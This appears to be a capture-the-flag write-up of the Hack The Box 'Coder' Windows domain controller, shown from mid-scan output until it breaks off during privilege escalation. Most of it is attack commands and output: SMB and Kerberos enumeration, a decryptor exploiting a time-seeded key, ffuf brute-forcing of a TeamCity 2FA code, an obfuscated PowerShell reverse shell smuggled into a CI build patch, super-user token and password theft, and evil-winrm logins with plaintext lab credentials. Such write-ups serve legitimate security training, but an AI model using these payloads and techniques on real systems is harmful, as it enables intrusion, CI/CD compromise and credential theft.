DNS:coder.htb, DNS:CODER | Not valid before: 2023-11-21T23:06:46 |_Not valid after: 2033-11-21T23:16:46 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER | Not valid before: 2023-11-21T23:06:46 |_Not valid after: 2033-11-21T23:16:46 |_ssl-date: 2023-12-14T00:43:51+00:00; +7h59m16s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49686/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49687/tcp open msrpc Microsoft Windows RPC 49689/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC 49708/tcp open msrpc Microsoft Windows RPC 49712/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-12-14T00:43:41 |_ start_date: N/A |_clock-skew: mean: 7h59m15s, deviation: 0s, median: 7h59m15s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-13 22:15 IST Nmap scan report for 10.129.229.190 Host is up (0.061s latency). PORT STATE SERVICE VERSION 53/udp open domain (generic dns response: SERVFAIL) | fingerprint-strings: | NBTStat: |_ CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 123/udp open ntp NTP v3 | ntp-info: |_ port 53 - DNS Enumeration #I was able to resolve both the domains using the DNS server. Unfortunately, nothing on zone transfer\n❯ dig +noall +answer coder.htb @10.129.229.190 coder.htb.\t600\tIN\tA\t10.129.229.190 ❯ dig +noall +answer dc01.coder.htb @10.129.229.190 dc01.coder.htb.\t3600\tIN\tA\t10.129.229.190 ❯ dig +noall +nocmd +answer axfr @10.129.229.190 coder.htb ; Transfer failed. port 80 - HTTP Enumeration #Ports 80 and 443 are directed to standard IIS pages. However, despite directory fuzzing, couldn\u0026rsquo;t find anything substantial.\nport 445 - SMB Enumeration #SMB has anonymous login enabled, with which I have read access to the Development and User shares.\n❯ nxc smb 10.129.229.190 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; SMB 10.129.229.190 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:False) SMB 10.129.229.190 445 DC01 [+] coder.htb\\guest: ❯ nxc smb 10.129.229.190 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.129.229.190 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:False) SMB 10.129.229.190 445 DC01 [+] coder.htb\\guest: SMB 10.129.229.190 445 DC01 [*] Enumerated shares SMB 10.129.229.190 445 DC01 Share Permissions Remark SMB 10.129.229.190 445 DC01 ----- ----------- ------ SMB 10.129.229.190 445 DC01 ADMIN$ Remote Admin SMB 10.129.229.190 445 DC01 C$ Default share SMB 10.129.229.190 445 DC01 Development READ SMB 10.129.229.190 445 DC01 IPC$ READ Remote IPC SMB 10.129.229.190 445 DC01 NETLOGON Logon server share SMB 10.129.229.190 445 DC01 SYSVOL Logon server share SMB 10.129.229.190 445 DC01 Users READ Since I can authenticate to SMB, brute-forced RIDs with NetExec and evaluated valid users using kerbrute. Unfortunately, non of them has Kerberos DONT_REQUIRE_PREAUTH flag set.\n❯ nxc smb 10.129.229.190 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --rid-brute 10000 | tee rid_brute.txt ❯ cat rid_brute.txt | grep SidTypeUser | awk \u0026#39;{ print $6 }\u0026#39; | awk -F\u0026#39;\\\u0026#39; \u0026#39;{print $2}\u0026#39; \u0026gt; valid_users.txt ❯ kerbrute userenum --dc 10.129.229.190 --domain coder.htb valid_users.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 12/13/23 - Ronnie Flathers @ropnop 2023/12/13 23:00:17 \u0026gt; Using KDC(s): 2023/12/13 23:00:17 \u0026gt; 10.129.229.190:88 2023/12/13 23:00:17 \u0026gt; [+] VALID USERNAME: c.cage@coder.htb 2023/12/13 23:00:17 \u0026gt; [+] VALID USERNAME: Guest@coder.htb 2023/12/13 23:00:17 \u0026gt; [+] VALID USERNAME: e.black@coder.htb 2023/12/13 23:00:17 \u0026gt; [+] VALID USERNAME: j.briggs@coder.htb 2023/12/13 23:00:17 \u0026gt; [+] VALID USERNAME: l.kang@coder.htb 2023/12/13 23:00:17 \u0026gt; [+] VALID USERNAME: s.blade@coder.htb 2023/12/13 23:00:17 \u0026gt; [+] VALID USERNAME: Administrator@coder.htb 2023/12/13 23:00:17 \u0026gt; [+] VALID USERNAME: DC01$@coder.htb 2023/12/13 23:00:17 \u0026gt; [+] VALID USERNAME: svc_teamcity@coder.htb 2023/12/13 23:00:17 \u0026gt; Done! Tested 10 usernames (9 valid) in 0.069 seconds ❯ GetNPUsers.py -usersfile valid_users.txt -request -format john -outputfile ASREProastables.txt -dc-ip 10.129.229.190 \u0026#39;coder.htb/\u0026#39; Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b26 - Copyright 2022 Fortra - forked by ThePorgs [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Guest doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User DC01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User e.black doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User c.cage doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User j.briggs doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User l.kang doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User s.blade doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User svc_teamcity doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set Encrypter.exe # Inside the Development share, the Migration directory houses various git repositories, including one named adcs_reporting. This repository\u0026rsquo;s name suggests a potential connection to Active Directory Certificate Services (ADCS) within the environment.\n❯ smbclient -N \\\\10.129.229.190\\Development ---snip--- smb: \\\u0026gt; ls Migrations\\ . D 0 Wed Nov 9 03:41:25 2022 .. D 0 Wed Nov 9 03:41:25 2022 adcs_reporting D 0 Wed Nov 9 03:41:25 2022 bootstrap-template-master D 0 Thu Nov 3 21:42:30 2022 Cachet-2.4 D 0 Thu Nov 3 21:42:36 2022 kimchi-master D 0 Thu Nov 3 21:42:41 2022 teamcity_test_repo D 0 Sat Nov 5 00:44:54 2022 6232831 blocks of size 4096. 1056150 blocks available smb: \\\u0026gt; ls \u0026#34;Temporary Projects\\\u0026#34; . D 0 Sat Nov 12 03:49:03 2022 .. D 0 Sat Nov 12 03:49:03 2022 Encrypter.exe A 5632 Fri Nov 4 22:21:59 2022 s.blade.enc A 3808 Sat Nov 12 03:47:08 2022 6232831 blocks of size 4096. 1056150 blocks available smb: \\\u0026gt; ❯ tree -a -L 3 . ├── Migrations │ ├── adcs_reporting │ │ ├── Get-ADCS_Report.ps1 │ │ └── .git │ ├── bootstrap-template-master │ │ └── bootstrap-responsive-web-application-template-master │ ├── Cachet-2.4 │ │ └── Cachet-2.4 │ ├── kimchi-master │ │ └── kimchi-master │ └── teamcity_test_repo │ ├── .git │ └── hello_world.ps1 └── Temporary Projects ├── Encrypter.exe └── s.blade.enc 13 directories, 4 files The Get-ADCS_Report.ps1 script appears to be a tool for generating ADCS (Active Directory Certificate Services) Certificate Expiration Reports. The script references two new users, namely pkiadmins and itsupport. However, according to Kerbrute, both users do not appear to be valid users in the domain.\n#Send mail function ---snip--- $emailFrom = \u0026#39;pkiadmins@coder.htb\u0026#39; $emailCC = \u0026#39;e.black@coder.htb\u0026#39; $emailTo = \u0026#39;itsupport@coder.htb\u0026#39; $smtpServer = \u0026#39;smtp.coder.htb\u0026#39; Send-MailMessage -SmtpServer $smtpServer -To $emailTo -Cc $emailCC -From $emailFrom -Subject $subject -Body $message -BodyAsHtml -Priority High } The other directories/ repos in Migrations don\u0026rsquo;t have any remote configured anything significant in their git configs. Additionally, the Temporary Projects directory has an executable and encrypted file. I downloaded all the files in the share to investigate further.\n❯ l Temporary\\ Projects Permissions Size User Date Modified Name .rw-r--r-- 5.6k kali 13 Dec 23:27 Encrypter.exe .rw-r--r-- 3.8k kali 13 Dec 23:27 s.blade.enc ❯ file Temporary\\ Projects/* Temporary Projects/Encrypter.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections Temporary Projects/s.blade.enc: data I decompiled the Encrypter.exe executable using VSCode\u0026rsquo;s ILSpy extension and found the source for the encryption functionality. It contains a class named AES with two key methods:\nMain():\nAccepts command-line arguments, specifically the filename to be encrypted. Defines a random Initialization Vector (IV) and key (array and array2, respectively). The seed for the random values is based on the Unix time in seconds at the moment. EncryptFile():\nUtilizes the RijndaelManaged Class, a symmetric block cipher. Implements the encryption process for the specified file. Encrypter.exe decompiled Decryption #To decrypt the s.blade.enc file, the corresponding key and IV are required. I initially attempted to derive them using various UTC time variations. However, each attempt resulted in an incorrect padding error, indicating potential issues with the key and/or IV. Crafting the decryption function is quite simple, all that\u0026rsquo;s required is to switch from using \u0026rsquo;encrypt\u0026rsquo; to \u0026lsquo;decrypt\u0026rsquo;.\nlong value = DateTimeOffset.UtcNow.ToUnixTimeSeconds(); DateTimeOffset epoch = new DateTimeOffset(1970, 1, 1, 0, 0, 0, TimeSpan.Zero); // long unixTime = epoch.ToUnixTimeSeconds(); // this is 0 long value = DateTimeOffset.UtcNow.ToUnixTimeSeconds(); DateTimeOffset now = DateTimeOffset.UtcNow; long value = now.ToUnixTimeSeconds(); I later realized, the encryption process uses DateTimeOffset.Now.ToUnixTimeSeconds() as the seed. This means that the seed is directly tied to the time of creation. Considering the SMB timestamp is Sat Nov 12 03:47:08 2022, the encryption seed is based on this specific time.\nsmb: \\\u0026gt; ls \u0026#34;Temporary Projects\\\u0026#34; . D 0 Sat Nov 12 03:49:03 2022 .. D 0 Sat Nov 12 03:49:03 2022 Encrypter.exe A 5632 Fri Nov 4 22:21:59 2022 s.blade.enc A 3808 Sat Nov 12 03:47:08 2022 Despite using the correct timestamp the issue persists, and an incorrect padding error continues to occur.\nUnhandled Exception: System.Security.Cryptography.CryptographicException: Padding is invalid and cannot be removed. It turned out that adjusting for my local timezone was necessary. I used ntpdate to calculate the offset and then incorporated that into the timespan calculation.\n❯ ntpdate -q 10.129.229.190 2023-12-14 09:30:14.469785 (+0530) +27446.563004 +/- 0.040961 10.129.229.190 s1 no-leap using System; using System.IO; using System.Security.Cryptography; internal class AES { public static void Main(string[] args) { string sourceFile = \u0026#34;s.blade.enc\u0026#34;; string destFile = Path.ChangeExtension(sourceFile, \u0026#34;.dec\u0026#34;); // s.blade.enc A 3808 Sat Nov 12 03:47:08 2022 // DateTimeOffset encryptionTimestamp = new DateTimeOffset(2022, 11, 12, 3, 47, 8, TimeSpan.Zero); // // SG VPN, so GMT+8 // DateTimeOffset encryptionTimestamp = new DateTimeOffset(2022, 11, 12, 3, 47, 8, TimeSpan.FromHours(8)); // ❯ ntpdate -q 10.129.229.190 // 2023-12-14 09:30:14.469785 (+0530) +27446.563004 +/- 0.040961 10.129.229.190 s1 no-leap TimeSpan offset = TimeSpan.FromHours(5) + TimeSpan.FromMinutes(30); DateTimeOffset encryptionTimestamp = new DateTimeOffset(2022, 11, 12, 3, 47, 8, offset); long value = encryptionTimestamp.ToUnixTimeSeconds(); Random random = new Random(Convert.ToInt32(value)); byte[] array = new byte[16]; random.NextBytes(array); byte[] array2 = new byte[32]; random.NextBytes(array2); DecryptFile(sourceFile, destFile, array2, array); } private static void DecryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV) { using (RijndaelManaged rijndaelManaged = new RijndaelManaged()) { rijndaelManaged.Padding = PaddingMode.PKCS7; using (FileStream stream = new FileStream(destFile, FileMode.Create)) using (ICryptoTransform transform = rijndaelManaged.CreateDecryptor(Key, IV)) using (CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write)) using (FileStream fileStream = new FileStream(sourceFile, FileMode.Open)) { byte[] array = new byte[1024]; int count; while ((count = fileStream.Read(array, 0, array.Length)) != 0) { cryptoStream.Write(array, 0, count); } } } } } Now, the Decryptor works as expected and successfully decodes the encrypted file which contains a 7z archive.\n❯ mcs Decryptor.cs ❯ ./Decryptor.exe ❯ file s.blade.dec s.blade.dec: 7-zip archive data, version 0.4 Keepass #In the archive, I discovered a Keepass database and its corresponding key file.\n❯ 7z l s.blade.dec ---snip--- Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2022-11-04 01:32:30 ..H.A 1024 1028 .key 2022-11-12 03:43:55 ....A 2590 2594 s.blade.kdbx ------------------- ----- ------------ ------------ ------------------------ 2022-11-12 03:43:55 3614 3622 2 files ---snip--- ❯ cp s.blade.dec decoded.7z ❯ 7z x decoded.7z -oextract -y ❯ l extract Permissions Size User Date Modified Name .rw-r--r-- 1.0k kali 4 Nov 2022 .key .rw-r--r-- 2.6k kali 12 Nov 2022 s.blade.kdbx ❯ file extract/* extract/s.blade.kdbx: Keepass password database 2.x KDBX I had issues getting kpcli to function—it consistently prompted for a password even after the key. Consequently, I opted for KeepassXC, a graphical alternative. Interestingly, the initial entry within the Keepass database houses Authenticator backup codes.\nKeePassXC The second entry corresponds to Office 365 credentials: s.blade@coder.htb with the password AmcwNO60Zg3vca3o0HDrTC6D. The third entry is of https://teamcity-dev.coder.htb with the credentials s.blade and password veh5nUSZFFoqz9CrrhSeuwhA.\nTeamCity Instance # The new teamcity-dev.coder.htb virtual host redirects to /login.html, which seems to be the login page of a self-hosted instance of JetBrains\u0026rsquo; TeamCity.\nTeamCity Login The credentials from Keepass successfully grant access, however, subsequently a 6-digit 2FA code is required.\n2A Password I assume the Authenticator backup codes obtained from Keepass were intended for use in this scenario however, I couldn\u0026rsquo;t figure it out. While testing the 2FA request, I noticed there was no rate limit, so, I decided to fuzz for a valid backup code. Using Burp\u0026rsquo;s \u0026ldquo;copy as curl\u0026rdquo; feature, I constructed the ffuf command. It returned several 503s initially, but eventually, I got a 302 response code with 130102 as the 6-digit password.\n❯ ffuf -c -w /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt \\ -u https://teamcity-dev.coder.htb/2fa.html \\ -H \u0026#39;Host: teamcity-dev.coder.htb\u0026#39; -H \u0026#39;Content-Length: 15\u0026#39; -H \u0026#39;X-Tc-Csrf-Token: 5595f039-460c-42a0-8a29-ccbb2d3a40a3\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded;charset=UTF-8\u0026#39; -H \u0026#39;Accept: application/json\u0026#39; -H \u0026#39;X-Teamcity-Client: Web UI\u0026#39; -H \u0026#39;X-Requested-With: XMLHttpRequest\u0026#39; -H \u0026#39;Origin: https://teamcity-dev.coder.htb\u0026#39; \\ -b \u0026#39;__test=1; TCSESSIONID=883D324096CA281F21119BDA94E2CFC0\u0026#39; \\ -d \u0026#34;password=FUZZ\u0026#34; \\ -o ffuf_2fa_brute.md -of md -mc all -fc 404 -fs 89 /\u0026#39;___\\ /\u0026#39;___\\ /\\___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : POST :: URL : https://teamcity-dev.coder.htb/2fa.html :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt :: Header : X-Requested-With: XMLHttpRequest :: Header : Origin: https://teamcity-dev.coder.htb :: Header : Cookie: __test=1; TCSESSIONID=883D324096CA281F21119BDA94E2CFC0 :: Header : Host: teamcity-dev.coder.htb :: Header : X-Tc-Csrf-Token: 5595f039-460c-42a0-8a29-ccbb2d3a40a3 :: Header : Accept: application/json :: Header : X-Teamcity-Client: Web UI :: Header : Content-Length: 15 :: Header : Content-Type: application/x-www-form-urlencoded;charset=UTF-8 :: Data : password=FUZZ :: Output file : ffuf_2fa_brute.md :: File format : md :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: all :: Filter : Response status: 404 :: Filter : Response size: 89 ________________________________________________ ...snip... 130102 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 136ms] After using the 2FA code, I was redirected to TeamCity\u0026rsquo;s projects page where I can inspect its builds.\nTeamCity build overview According to Development_Testing\u0026rsquo;s first build log, a powershell script named hello_world.ps1 is being executed. This script seems to be associated with the teamcity_test_repo directory in the Development SMB share, as indicated by the vcsroot URL in the parameters tab.\n❯ l teamcity_test_repo Permissions Size User Date Modified Name drwxr-xr-x - kali 13 Dec 23:56 .git .rw-r--r-- 67 kali 13 Dec 23:27 hello_world.ps1 ❯ cat teamcity_test_repo/hello_world.ps1 #Simple repo test for Teamcity pipeline write-host \u0026#34;Hello, World!\u0026#34; Development_Testing build log Unfortunately, I don\u0026rsquo;t have any write perms so cannot change the powershell script.\n❯ smbclient -N //10.129.229.190/Development Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; cd Migrations\\teamcity_test_repo\\ smb: \\Migrations\\teamcity_test_repo\\\u0026gt; put hello_world.ps1 NT_STATUS_ACCESS_DENIED opening remote file \\Migrations\\teamcity_test_repo\\hello_world.ps1 Personal Builds #Looking for other ways to update the file, I came across a potential solution using personal builds. In short, it involves uploading a patch file containing the diff for the new file.\nPersonal Builds I modified the script to say Hello, Abraxas! and generated a patch file.\n❯ micro hello_world.ps1 ❯ cat hello_world.ps1 #Simple repo test for Teamcity pipeline write-host \u0026#34;Hello, Abraxas!\u0026#34; ❯ git diff \u0026gt; test.patch ❯ cat test.patch diff --git a/hello_world.ps1 b/hello_world.ps1 index 09724d2..ecc0120 100644 --- a/hello_world.ps1 +++ b/hello_world.ps1 @@ -1,2 +1,2 @@ #Simple repo test for Teamcity pipeline -write-host \u0026#34;Hello, World!\u0026#34; +write-host \u0026#34;Hello, Abraxas!\u0026#34; After uploading the patch file through the personal build, the log now prints the script output as Hello, Abraxas!.\nPersonal build log Shell as svc_teamcity #Subsequently, I attempted a standard reverse shell payload, but I got no response, possibly due to AMSI or Defender. In an attempt to bypass that, I used a powershell obfuscated payload, which gave me a shell as the svc_teamcity user on my local netcat listener.\n❯ git diff \u0026gt; rev_shell.patch ❯ cat rev_shell.patch diff --git a/hello_world.ps1 b/hello_world.ps1 index 09724d2..aab74af 100644 --- a/hello_world.ps1 +++ b/hello_world.ps1 @@ -1,2 +1,18 @@ -#Simple repo test for Teamcity pipeline -write-host \u0026#34;Hello, World!\u0026#34; +Set-Alias -Name K -Value Out-String +Set-Alias -Name nothingHere -Value iex +$BT = New-Object \u0026#34;S`y`stem.Net.Sockets.T`CPCl`ient\u0026#34;(\u0026#39;10.10.14.49\u0026#39;,9005); +$replace = $BT.GetStream(); +[byte[]]$B = 0..(32768*2-1)|%{0}; +$B = ([text.encoding]::UTF8).GetBytes(\u0026#34;(c) Microsoft Corporation. All rights reserved.`n`n\u0026#34;) +$replace.Write($B,0,$B.Length) +$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + \u0026#39;\u0026gt;\u0026#39;) +$replace.Write($B,0,$B.Length) +[byte[]]$int = 0..(10000+55535)|%{0}; +while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){; +$ROM = [text.encoding]::ASCII.GetString($int,0, $i); +$I = (nothingHere $ROM 2\u0026gt;\u0026amp;1 | K ); +$I2 = $I + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;; +$U = [text.encoding]::ASCII.GetBytes($I2); +$replace.Write($U,0,$U.Length); +$replace.Flush()}; +$BT.Close() CI/CD Command execution ❯ rlwrap nc -nlvp 9005 listening on [any] 9005 ... connect to [10.10.14.49] from (UNKNOWN) [10.129.229.190] 59269 (c) Microsoft Corporation. All rights reserved. C:\\TeamCity\\buildAgent\\work\\74c2f03019966b3e\u0026gt;whoami coder\\svc_teamcity C:\\TeamCity\\buildAgent\\work\\74c2f03019966b3e\u0026gt; Horizontal Privilege Escalation # TeamCity Super User #I couldn\u0026rsquo;t find anything significant as svc_teamcity, but I did notice the presence of a SuperUser in TeamCity\u0026rsquo;s documentation. SuperUser login can be found at https://teamcity-dev.coder.htb/login.html?super=1.\nTeamCity Super User The authentication token for the Super User can be found in TeamCity\u0026rsquo;s logs, specifically under C:\\TeamCity\\logs.\nC:\\TeamCity\\logs\u0026gt; findstr /spin /c:\u0026#34;Super user authentication token\u0026#34; *.* --snip-- --snip-- teamcity-winservice.log:5649:[2023-12-15 19:14:27,839] console [Info] [TeamCity] Super user authentication token: 4131629497269471073 (use empty username with the token as the password to access the server) teamcity-winservice.log:5652:[2023-12-15 19:21:04,376] console [Info] [TeamCity] Super user authentication token: 4131629497269471073 (use empty username with the token as the password to access the server) --snip-- Logging as Super User, I can see the ADCS_Reporting project.\nSuper user overview Under the changes tab, I found a diff containing two new files, key.key and enc.txt in the ADCS_Reporting.\nADCS_Reporting personal build Unfortunately, I cannot view or download the two new files.\nError I decided to go back to the shell as svc_teamcity to look for the files in the diff in the system directory. Found the TeamCity directory at C:\\ProgramData\\JetBrains\\TeamCity. The changes directory in under system contains a bunch of patch files\nC:\\ProgramData\\JetBrains\\TeamCity\u0026gt; ls Directory: C:\\ProgramData\\JetBrains\\TeamCity Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 12/13/2023 11:00 PM config d----- 11/3/2022 3:08 PM lib d----- 11/3/2022 3:09 PM plugins d----- 12/13/2023 11:00 PM system C:\\ProgramData\\JetBrains\\TeamCity\u0026gt; ls system\\changes Directory: C:\\ProgramData\\JetBrains\\TeamCity\\system\\changes Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 11/8/2022 2:18 PM 1707 101.changes.diff -a---- 12/13/2023 10:28 PM 236 201.changes.diff -a---- 12/13/2023 10:31 PM 236 202.changes.diff -a---- 12/13/2023 10:36 PM 977 203.changes.diff -a---- 12/13/2023 10:40 PM 977 204.changes.diff The first patch file, 101.changes.diff contains a diff for the three files I found before. The others relate to my reverse shell payload.\nC:\\ProgramData\\JetBrains\\TeamCity\\system\\changes\u0026gt; cat 101.changes.diff diff --git a/Get-ADCS_Report.ps1 b/Get-ADCS_Report.ps1 index d6515ce..a990b2e 100644 --- a/Get-ADCS_Report.ps1 +++ b/Get-ADCS_Report.ps1 @@ -77,11 +77,15 @@ Function script:send_mail { [string] ---snip--- ---snip--- diff --git a/enc.txt b/enc.txt new file mode 100644 index 0000000..d352634 --- /dev/null +++ b/enc.txt @@ -0,0 +1,2 @@ +76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQAN +AA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA== diff --git a/key.key b/key.key new file mode 100644 index 0000000..a6285ed --- /dev/null +++ b/key.key @@ -0,0 +1,32 @@ +144 +255 +52 ---snip--- ---snip--- +112 +20 +122 C:\\ProgramData\\JetBrains\\TeamCity\\system\\changes\u0026gt; Decrypting credentials #To recover files in the patch, I initiated a new Git repository with two files with the same name and committed them. Subsequently, I copied over the patch file and applied it.\n❯ touch enc.txt key.key ❯ git init -q ❯ git add . ❯ git commit -m \u0026#39;init\u0026#39; [main (root-commit) a82b82a] init 2 files changed, 0 insertions(+), 0 deletions(-) create mode 100644 enc.txt create mode 100644 key.key ❯ cp ../creds.patch . ❯ patch -i creds.patch patching file enc.txt patching file key.key I was able to decrypt the credential using powershell. Considering the sole other user with a directory under C:\\Users is e.black, I presume these credentials belong to them.\n❯ $user = \u0026#39;coder.htb\\e.black\u0026#39; ❯ $encrypted = gc .\\enc.txt ❯ $key = gc .\\key.key ❯ $secureObject = ConvertTo-SecureString -String $encrypted -Key $key ❯ $creds = New-Object System.management.Automation.PSCredential($user, $secureObject) ❯ $creds.GetNetworkCredential() | fl UserName : e.black Password : ypOSJXPqlDOxxbQSfEERy300 SecurePassword : System.Security.SecureString Domain : coder.htb It can also be done using InteropServices.\n❯ $decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject) ❯ $decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted) ❯ $decrypted ypOSJXPqlDOxxbQSfEERy300 I was successfully able to authenticate as E.Black with the new password over SMB and WinRM\n❯ nxc smb 10.129.229.190 -u \u0026#39;e.black\u0026#39; -p \u0026#39;ypOSJXPqlDOxxbQSfEERy300\u0026#39; SMB 10.129.229.190 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:False) SMB 10.129.229.190 445 DC01 [+] coder.htb\\e.black:ypOSJXPqlDOxxbQSfEERy300 ❯ nxc smb 10.129.229.190 -u \u0026#39;e.black\u0026#39; -p \u0026#39;ypOSJXPqlDOxxbQSfEERy300\u0026#39; --shares SMB 10.129.229.190 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:False) SMB 10.129.229.190 445 DC01 [+] coder.htb\\e.black:ypOSJXPqlDOxxbQSfEERy300 SMB 10.129.229.190 445 DC01 [*] Enumerated shares SMB 10.129.229.190 445 DC01 Share Permissions Remark SMB 10.129.229.190 445 DC01 ----- ----------- ------ SMB 10.129.229.190 445 DC01 ADMIN$ Remote Admin SMB 10.129.229.190 445 DC01 C$ Default share SMB 10.129.229.190 445 DC01 Development READ SMB 10.129.229.190 445 DC01 IPC$ READ Remote IPC SMB 10.129.229.190 445 DC01 NETLOGON READ Logon server share SMB 10.129.229.190 445 DC01 SYSVOL READ Logon server share SMB 10.129.229.190 445 DC01 Users READ ❯ nxc winrm 10.129.229.190 -u \u0026#39;e.black\u0026#39; -p \u0026#39;ypOSJXPqlDOxxbQSfEERy300\u0026#39; SMB 10.129.229.190 5985 DC01 [*] Windows 10.0 Build 17763 (name:DC01) (domain:coder.htb) HTTP 10.129.229.190 5985 DC01 [*] http://10.129.229.190:5985/wsman HTTP 10.129.229.190 5985 DC01 [+] coder.htb\\e.black:ypOSJXPqlDOxxbQSfEERy300 (Pwn3d!) Using evil-winrm, I got a shell as e.black.\n❯ evil-winrm -i 10.129.229.190 -u \u0026#39;e.black\u0026#39; -p \u0026#39;ypOSJXPqlDOxxbQSfEERy300\u0026#39; Evil-WinRM shell v3.5 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\e.black\\Documents\u0026gt; whoami coder\\e.black *Evil-WinRM* PS C:\\Users\\e.black\\Documents\u0026gt; Vertical Privilege Escalation # E.Black is part of the Coder\\PKI Admins group. The group seems to be used for ADCS Certificate and Template Management.\n*Evil-WinRM* PS C:\\Users\\e.black\\Documents\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================== ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTIN\\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group CODER\\PKI Admins Group S-1-5-21-2608251805-3526430372-1546376444-2101 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 I can verify the presence of a Certificate Authority, coder-DC01-CA using certutil.\n*Evil-WinRM* PS 